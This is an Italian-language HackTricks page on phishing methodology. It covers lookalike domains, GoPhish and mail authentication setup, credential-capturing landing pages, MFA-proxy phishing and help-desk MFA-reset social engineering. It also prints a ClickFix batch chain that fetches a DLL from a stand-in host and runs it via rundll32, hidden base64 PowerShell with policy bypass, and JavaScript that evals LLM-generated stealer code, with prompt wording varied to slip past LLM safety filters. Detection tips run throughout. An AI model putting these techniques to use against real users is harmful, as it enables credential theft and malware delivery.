# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Recon del victim
1. Seleziona il **victim domain**.
2. Esegui una base web enumeration **cercando i login portal** usati dal victim e **decidi** quale **impersonare**.
3. Usa un po' di **OSINT** per **trovare email**.
2. Prepara l'ambiente
1. **Compra il domain** che userai per il phishing assessment
2. **Configura i record** del servizio email correlati (SPF, DMARC, DKIM, rDNS)
3. Configura il VPS con **gophish**
3. Prepara la campaign
1. Prepara il **email template**
2. Prepara la **web page** per rubare le credenziali
4. Lancia la campaign!

## Genera nomi di domain simili o compra un trusted domain

### Domain Name Variation Techniques

- **Keyword**: Il nome del domain **contiene** una **keyword** importante del domain originale (e.g., zelster.com-management.com).
- **hypened subdomain**: Cambia il **dot con un hyphen** di un subdomain (e.g., www-zelster.com).
- **New TLD**: Stesso domain usando un **new TLD** (e.g., zelster.org)
- **Homoglyph**: **Sostituisce** una lettera nel nome del domain con **lettere che sembrano simili** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Scambia due lettere** all'interno del nome del domain (e.g., zelsetr.com).
- **Singularization/Pluralization**: Aggiunge o rimuove “s” alla fine del nome del domain (e.g., zeltsers.com).
- **Omission**: **Rimuove una** delle lettere dal nome del domain (e.g., zelser.com).
- **Repetition:** **Ripete una** delle lettere nel nome del domain (e.g., zeltsser.com).
- **Replacement**: Come homoglyph ma meno stealthy. Sostituisce una delle lettere nel nome del domain, magari con una lettera vicina all'originale sulla tastiera (e.g, zektser.com).
- **Subdomained**: Introduci un **dot** all'interno del nome del domain (e.g., ze.lster.com).
- **Insertion**: **Inserisce una lettera** nel nome del domain (e.g., zerltser.com).
- **Missing dot**: Aggiunge il TLD al nome del domain. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

C'è la **possibilità che uno di alcuni bit memorizzati o in transito venga automaticamente invertito** a causa di vari fattori come solar flares, cosmic rays o errori hardware.

Quando questo concetto viene **applicato alle richieste DNS**, è possibile che il **domain ricevuto dal DNS server** non sia lo stesso domain inizialmente richiesto.

Per esempio, una singola modifica di bit nel domain "windows.com" può cambiarlo in "windnws.com."

Gli attackers possono **approfittarne registrando più bit-flipping domain** simili al domain del victim. La loro intenzione è reindirizzare gli utenti legittimi verso la propria infrastructure.

Per maggiori informazioni leggi [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Compra un trusted domain

Puoi cercare in [https://www.expireddomains.net/](https://www.expireddomains.net) un expired domain che potresti usare.\
Per assicurarti che l'expired domain che stai per comprare **abbia già un buon SEO** puoi controllare come è categorizzato in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Scoprire Email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Per **scoprire più** indirizzi email validi o **verificare quelli** che hai già scoperto puoi controllare se riesci a fare brute-force dei loro smtp servers del victim. [Scopri come verificare/scoprire email address qui](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Inoltre, non dimenticare che se gli utenti usano **qualsiasi web portal per accedere alle loro mail**, puoi controllare se è vulnerabile a **username brute force**, ed exploitare la vulnerabilità se possibile.

## Configurare GoPhish

### Installation

Puoi scaricarlo da [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Scaricalo e decomprimilo dentro `/opt/gophish` ed esegui `/opt/gophish/gophish`\
Ti verrà fornita una password per l'admin user sulla porta 3333 nell'output. Pertanto, accedi a quella porta e usa quelle credenziali per cambiare la password admin. Potresti dover tunnellare quella porta verso local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configurazione

**Configurazione del certificato TLS**

Prima di questo passaggio dovresti aver **già acquistato il dominio** che intendi usare e deve essere **puntato** all'**IP del VPS** su cui stai configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configurazione mail**

Inizia installando: `apt-get install postfix`

Poi aggiungi il dominio ai seguenti file:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Cambia anche i valori delle seguenti variabili all'interno di /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Infine modifica i file **`/etc/hostname`** e **`/etc/mailname`** con il nome del tuo dominio e **riavvia il tuo VPS.**

Ora, crea un record **DNS A** di `mail.<domain>` che punti all'**indirizzo IP** del VPS e un record **DNS MX** che punti a `mail.<domain>`

Ora testiamo l'invio di una email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configurazione di Gophish**

Interrompi l'esecuzione di gophish e configuriamolo.\
Modifica `/opt/gophish/config.json` come segue (nota l'uso di https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configura il servizio gophish**

Per creare il servizio gophish in modo che possa essere avviato automaticamente e gestito come servizio, puoi creare il file `/etc/init.d/gophish` con il seguente contenuto:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Completa la configurazione del servizio e controllalo facendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurazione del mail server e dominio

### Aspetta & sii legittimo

Più un dominio è vecchio, minore è la probabilità che venga rilevato come spam. Quindi dovresti aspettare il più a lungo possibile (almeno 1 settimana) prima della phishing assessment. moreover, se metti una pagina su un settore con buona reputazione, la reputazione ottenuta sarà migliore.

Nota che anche se devi aspettare una settimana puoi finire di configurare tutto ora.

### Configura il record Reverse DNS (rDNS)

Imposta un record rDNS (PTR) che risolva l'indirizzo IP del VPS al nome del dominio.

### Sender Policy Framework (SPF) Record

Devi **configurare un record SPF per il nuovo dominio**. Se non sai cos'è un record SPF [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puoi usare [https://www.spfwizard.net/](https://www.spfwizard.net) per generare la tua policy SPF (usa l'IP della macchina VPS)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Questo è il contenuto che deve essere impostato dentro un record TXT all'interno del dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Record Domain-based Message Authentication, Reporting & Conformance (DMARC)

Devi **configurare un record DMARC per il nuovo dominio**. Se non sai cos'è un record DMARC, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Devi creare un nuovo record DNS TXT che punti all'hostname `_dmarc.<domain>` con il seguente contenuto:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Devi **configurare un DKIM per il nuovo dominio**. Se non sai cos'è un record DMARC [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Questo tutorial si basa su: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Devi concatenare entrambi i valori B64 che la chiave DKIM genera:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testa il punteggio della configurazione email

Puoi farlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accedi semplicemente alla pagina e invia un'email all'indirizzo che ti danno:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Puoi anche **verificare la tua configurazione email** inviando un'email a `check-auth@verifier.port25.com` e **leggendo la risposta** (per questo dovrai **aprire** la porta **25** e vedere la risposta nel file _/var/mail/root_ se invii l'email come root).\
Verifica di superare tutti i test:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Potresti anche inviare **message a una Gmail sotto il tuo controllo**, e controllare gli **header dell'email** nella tua inbox di Gmail, `dkim=pass` dovrebbe essere presente nel campo header `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Rimuovere da Spamhouse Blacklist

La pagina [www.mail-tester.com](https://www.mail-tester.com) può indicarti se il tuo dominio è bloccato da spamhouse. Puoi richiedere la rimozione del tuo dominio/IP qui: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Rimuovere da Microsoft Blacklist

​​Puoi richiedere la rimozione del tuo dominio/IP qui [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Imposta un **nome per identificare** il sender profile
- Decidi da quale account inviare le phishing email. Suggerimenti: _noreply, support, servicedesk, salesforce..._
- Puoi lasciare vuoti username e password, ma assicurati di selezionare Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Si consiglia di usare la funzionalità "**Send Test Email**" per verificare che tutto funzioni.\
> Consiglierei di **inviare le email di test a indirizzi 10min mails** per evitare di finire in blacklist durante i test.

### Email Template

- Imposta un **nome per identificare** il template
- Poi scrivi un **subject** (niente di strano, solo qualcosa che ti aspetteresti di leggere in una email normale)
- Assicurati di aver selezionato "**Add Tracking Image**"
- Scrivi il **email template** (puoi usare variabili come nell'esempio seguente):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Nota che **per aumentare la credibilità dell'email**, è consigliato usare qualche signature di un'email del client. Suggerimenti:

- Invia un'email a un **indirizzo inesistente** e controlla se la risposta ha qualche signature.
- Cerca **email pubbliche** come info@ex.com o press@ex.com o public@ex.com e invia loro un'email e aspetta la risposta.
- Prova a contattare **qualche email valida scoperta** e aspetta la risposta

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> L'Email Template permette anche di **allegare file da inviare**. Se vuoi anche rubare challenge NTLM usando file/documenti appositamente creati [leggi questa pagina](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Scrivi un **nome**
- **Scrivi il codice HTML** della pagina web. Nota che puoi **importare** pagine web.
- Seleziona **Capture Submitted Data** e **Capture Passwords**
- Imposta una **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Di solito dovrai modificare il codice HTML della pagina e fare alcuni test in locale (magari usando un server Apache) **finché non ti piacciono i risultati.** Poi, scrivi quel codice HTML nella casella.\
> Nota che se devi **usare risorse statiche** per l'HTML (magari alcune pagine CSS e JS) puoi salvarle in _**/opt/gophish/static/endpoint**_ e poi accederci da _**/static/\<filename>**_

> [!TIP]
> Per la redirection potresti **reindirizzare gli utenti alla pagina web principale legittima** della vittima, oppure reindirizzarli a _/static/migration.html_ per esempio, mettendo una **rotating wheel (**[**https://loading.io/**](https://loading.io)**) per 5 secondi e poi indicare che il processo è andato a buon fine**.

### Users & Groups

- Imposta un nome
- **Importa i dati** (nota che per usare il template dell'esempio ti servono firstname, last name e email address di ogni user)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Infine, crea una campaign selezionando un nome, il template email, la landing page, l'URL, il sending profile e il group. Nota che l'URL sarà il link inviato alle vittime

Nota che il **Sending Profile permette di inviare un test email per vedere come sarà l'email phishing finale**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Ti consiglierei di **inviare le test email ad indirizzi 10min mail** per evitare di essere inserito in blacklist durante i test.

Una volta che tutto è pronto, avvia la campaign!

## Website Cloning

Se per qualche motivo vuoi clonare il website, controlla la seguente pagina:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In alcune phishing assessment (soprattutto per i Red Teams) vorrai anche **inviare file contenenti qualche tipo di backdoor** (magari una C2 o magari solo qualcosa che attivi un'autenticazione).\
Controlla la seguente pagina per alcuni esempi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attacco precedente è piuttosto ingegnoso perché stai falsificando un vero website e raccogliendo le informazioni inserite dall'utente. Purtroppo, se l'utente non ha inserito la password corretta o se l'application che hai falsificato è configurata con 2FA, **queste informazioni non ti permetteranno di impersonare l'utente ingannato**.

Qui sono utili tool come [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena). Questo tool ti permetterà di generare un attacco tipo MitM. In pratica, gli attacchi funzionano nel seguente modo:

1. Tu **impersoni il login** form della vera webpage.
2. L'utente **invia** le sue **credentials** alla tua fake page e il tool le invia alla vera webpage, **verificando se le credentials funzionano**.
3. Se l'account è configurato con **2FA**, la pagina MitM lo chiederà e, una volta che l'**user lo introduce**, il tool lo invierà alla vera web page.
4. Una volta che l'utente è autenticato tu (come attacker) avrai **catturato le credentials, il 2FA, il cookie e qualsiasi informazione** di ogni interazione mentre il tool sta eseguendo un MitM.

### Via VNC

E se invece di **inviare la vittima a una pagina malevola** con lo stesso aspetto dell'originale, la invii a una **sessione VNC con un browser collegato alla vera web page**? Potrai vedere cosa fa, rubare la password, il MFA usato, i cookie...\
Puoi farlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Ovviamente uno dei modi migliori per sapere se sei stato scoperto è **cercare il tuo domain nelle blacklist**. Se appare elencato, in qualche modo il tuo domain è stato rilevato come sospetto.\
Un modo semplice per verificare se il tuo domain appare in qualche blacklist è usare [https://malwareworld.com/](https://malwareworld.com)

Tuttavia, ci sono altri modi per sapere se la vittima sta **cercando attivamente sospette attività phishing nel wild** come spiegato in:


{{#ref}}
detecting-phising.md
{{#endref}}

Puoi **comprare un domain con un nome molto simile** al domain della vittima **e/o generare un certificate** per un **subdomain** di un domain controllato da te **contenente** la **keyword** del domain della vittima. Se la **vittima** esegue qualsiasi tipo di interazione **DNS o HTTP** con essi, saprai che **sta cercando attivamente** domain sospetti e dovrai essere molto stealth.

### Evaluate the phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious) per valutare se la tua email finirà nella spam folder oppure se sarà bloccata o avrà successo.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

I modern intrusion set sempre più spesso saltano del tutto i lure via email e **prendono direttamente di mira il service-desk / identity-recovery workflow** per aggirare MFA. L'attacco è completamente "living-off-the-land": una volta che l'operator ha credenziali valide, si sposta usando tooling amministrativi integrati – non serve alcun malware.

### Attack flow
1. Recon la vittima
* Raccogli dettagli personali e aziendali da LinkedIn, data breach, public GitHub, ecc.
* Identifica identità ad alto valore (executive, IT, finance) ed enumera l'**esatto help-desk process** per il reset di password / MFA.
2. Social engineering in tempo reale
* Chiama, usa Teams o chatta con l'help-desk impersonando il target (spesso con **spoofed caller-ID** o **cloned voice**).
* Fornisci la PII raccolta in precedenza per superare la verifica basata sulla conoscenza.
* Convince l'agent a **reset the MFA secret** o a eseguire un **SIM-swap** su un numero mobile registrato.
3. Azioni immediate post-accesso (≤60 min in casi reali)
* Stabilisci un foothold tramite qualsiasi web SSO portal.
* Enumera AD / AzureAD con built-ins (senza binari scaricati):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement con **WMI**, **PsExec**, o agent **RMM** legittimi già whitelisted nell'ambiente.

### Detection & Mitigation
* Tratta l'identity recovery dell'help-desk come un'**operazione privilegiata** – richiedi step-up auth e approvazione del manager.
* Distribuisci regole **Identity Threat Detection & Response (ITDR)** / **UEBA** che segnalino:
* MFA method changed + authentication from new device / geo.
* Elevazione immediata dello stesso principal (user-→-admin).
* Registra le chiamate dell'help-desk e imponi una **call-back a un numero già registrato** prima di qualsiasi reset.
* Implementa **Just-In-Time (JIT) / Privileged Access** in modo che gli account appena resettati non ereditino automaticamente token ad alto privilegio.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew compensano il costo delle operazioni high-touch con attacchi di massa che trasformano **search engines & ad networks nel canale di delivery**.

1. **SEO poisoning / malvertising** spinge un risultato falso come `chromium-update[.]site` in cima agli search ads.
2. La vittima scarica un piccolo **first-stage loader** (spesso JS/HTA/ISO). Esempi visti da Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Il loader esfiltra browser cookies + credential DBs, poi carica un **silent loader** che decide – *in realtime* – se deployare:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blocca i domain appena registrati e applica **Advanced DNS / URL Filtering** sia alle *search-ads* sia alla e-mail.
* Limita l'installazione software a MSI firmati / pacchetti Store, nega l'esecuzione di `HTA`, `ISO`, `VBS` tramite policy.
* Monitora i child processes dei browser che aprono installer:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Dai la caccia ai LOLBins spesso abusati dai first-stage loader (e.g. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: advisory CERT nazionale clonato con un pulsante **Update** che mostra istruzioni di “fix” passo per passo. Alle vittime viene detto di eseguire un batch che scarica una DLL ed esegue la DLL tramite `rundll32`.
* Tipica catena batch osservata:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` scarica il payload in `%TEMP%`, una breve pausa nasconde il network jitter, poi `rundll32` chiama l'entrypoint esportato (`notepad`).
* La DLL beacon l'identità dell'host e interroga il C2 ogni pochi minuti. Il remote tasking arriva come **base64-encoded PowerShell** eseguito nascosto e con policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Questo mantiene la flessibilità del C2 (il server può cambiare i task senza aggiornare la DLL) e nasconde le finestre della console. Dai la caccia ai child di PowerShell di `rundll32.exe` usando insieme `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* I defender possono cercare callback HTTP(S) del tipo `...page.php?tynor=<COMPUTER>sss<USER>` e intervalli di polling di 5 minuti dopo il caricamento della DLL.

---

## AI-Enhanced Phishing Operations
Gli attacker ora concatenano **LLM & voice-clone APIs** per lure completamente personalizzati e interazione in tempo reale.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Aggiungi **dynamic banners** che evidenziano i messaggi inviati da automazione non affidabile (tramite anomalie ARC/DKIM).
• Distribuisci **voice-biometric challenge phrases** per richieste telefoniche ad alto rischio.
• Simula continuamente lure generate da AI nei programmi di awareness – i template statici sono obsoleti.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Gli attacker possono spedire HTML dall'aspetto benigno e **generare lo stealer a runtime** chiedendo a una **trusted LLM API** del JavaScript, poi eseguendolo nel browser (e.g., `eval` o `<script>` dinamico).

1. **Prompt-as-obfuscation:** codifica gli URL di exfil/Base64 strings nel prompt; varia il wording per bypassare i safety filter e ridurre le hallucinations.
2. **Client-side API call:** al load, JS chiama un LLM pubblico (Gemini/DeepSeek/etc.) o un CDN proxy; solo il prompt/API call è presente nell'HTML statico.
3. **Assemble & exec:** concatena la response ed eseguila (polymorphic per visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** il codice generato personalizza il lure (ad esempio, parsing del token LogoKit) e invia le credenziali all'endpoint nascosto dal prompt.

**Caratteristiche di evasione**
- Il traffico raggiunge domini LLM noti o proxy CDN affidabili; a volte tramite WebSockets verso un backend.
- Nessun payload statico; il JavaScript malevolo esiste solo dopo il render.
- Generazioni non deterministiche producono **stealer unici** per sessione.

**Idee di rilevamento**
- Eseguire sandbox con JS abilitato; segnalare **`eval` runtime / creazione dinamica di script provenienti da risposte LLM**.
- Cercare POST front-end verso API LLM immediatamente seguiti da `eval`/`Function` sul testo restituito.
- Generare alert su domini LLM non autorizzati nel traffico client più i successivi POST di credenziali.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Oltre al classico push-bombing, gli operatori semplicemente **forzano una nuova registrazione MFA** durante la chiamata al help-desk, annullando il token esistente dell’utente. Qualsiasi successivo prompt di login appare legittimo alla vittima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitora eventi AzureAD/AWS/Okta in cui **`deleteMFA` + `addMFA`** avvengono **entro pochi minuti dallo stesso IP**.



## Clipboard Hijacking / Pastejacking

Gli attacker possono copiare silenziosamente comandi malevoli negli appunti della vittima da una pagina web compromessa o typosquatted e poi ingannare l'utente facendoli incollare dentro **Win + R**, **Win + X** o una finestra terminale, eseguendo codice arbitrario senza alcun download o allegato.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Una lure page (ad es. un falso canale ministeriale/CERT) mostra un QR di WhatsApp Web/Desktop e istruisce la vittima a scansionarlo, aggiungendo silenziosamente l'attacker come **linked device**.
* L'attacker ottiene immediatamente visibilità su chat/contatti finché la sessione non viene rimossa. Le vittime possono poi vedere una notifica di “new device linked”; i defender possono cercare eventi di device-link inattesi poco dopo visite a pagine QR non fidate.

### Mobile‑gated phishing to evade crawlers/sandboxes
Gli operatori stanno sempre più spesso mettendo i loro flussi di phishing dietro un semplice controllo del device, così i crawler desktop non raggiungono mai le pagine finali. Un pattern comune è un piccolo script che verifica la presenza di un DOM touch-capable e invia il risultato a un endpoint server; i client non‑mobile ricevono HTTP 500 (o una pagina vuota), mentre agli utenti mobile viene servito il flusso completo.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logic (simplified):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server behaviour often observed:
- Imposta un cookie di sessione durante il primo caricamento.
- Accetta `POST /detect {"is_mobile":true|false}`.
- Restituisce 500 (o un placeholder) alle successive GET quando `is_mobile=false`; serve la phishing solo se `true`.

Hunting and detection heuristics:
- query urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria web: sequenza di `GET /static/detect_device.js` → `POST /detect` → HTTP 500 per non-mobile; i percorsi legittimi della vittima mobile restituiscono 200 con HTML/JS successivo.
- Blocca o esamina con attenzione le pagine che condizionano il contenuto esclusivamente su `ontouchstart` o controlli simili del device.

Defence tips:
- Esegui i crawler con fingerprint simili a mobile e JS abilitato per rivelare contenuti gated.
- Genera alert su risposte 500 sospette dopo `POST /detect` su domini registrati di recente.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
